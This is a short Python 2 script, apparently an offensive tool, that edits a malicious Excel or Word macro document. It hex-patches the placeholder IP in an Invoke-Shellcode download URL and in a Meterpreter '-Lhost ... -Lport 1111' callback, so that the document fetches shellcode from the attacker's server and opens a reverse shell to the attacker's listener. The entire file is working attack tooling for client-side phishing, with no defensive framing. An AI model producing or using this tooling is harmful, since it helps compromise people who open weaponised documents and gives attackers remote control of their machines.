#https://raw.githubusercontent.com/enigma0x3/Powershell-Payload-Excel-Delivery/master/MacroCode
#https://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/

import os
import re
import argparse
import binascii
import sys

def updateXLS(origFile,outFile,replaceIP):

	with open(origFile, "rb") as input_file:
		content = input_file.read()
	
	content1 = binascii.hexlify(content)

	origText1 = "http://xxx.xxx.xxx.xxx/Invoke-Shellcode".encode('hex')
	replaceText1Orig = "http://"+replaceIP+"/Invoke-Shellcode"
	replaceText1 = replaceText1Orig.encode('hex')

	missingLen = len(origText1)-len(replaceText1)
	numTimes = missingLen/2
	replaceText1+=(numTimes*"20")
	content1 = content1.replace(origText1,replaceText1)


	origText3 = "-Lhost xxx.xxx.xxx.xxx -Lport 1111".encode('hex')
	replaceText3Orig = "-Lhost "+replaceIP+" -Lport 1111"
	replaceText3 = replaceText3Orig.encode('hex')
	missingLen = len(origText3)-len(replaceText3)
	numTimes = missingLen/2
	replaceText3+=(numTimes*"20")
	content1 = content1.replace(origText3,replaceText3)


	binary_string = binascii.unhexlify(content1)

	file = open(outFile, "wb")
	file.write(binary_string)
	file.close()

if __name__ == '__main__':
    global filename
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', action='store', help='[input microsoft excel/word filename]')
    parser.add_argument('-o', action='store', help='[output filename]')
    parser.add_argument('-ip', action='store', help='[public ip address of meterpreter listener]')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.i and options.o and options.ip:
	#origFile = os.getcwd()+"/"+options.i
	origFile = options.i
	outputFile = options.o
	replaceIP = options.ip
	updateXLS(origFile,outputFile,replaceIP)
	print "- Generated :"+outputFile
    else:
	parser.print_help()
	
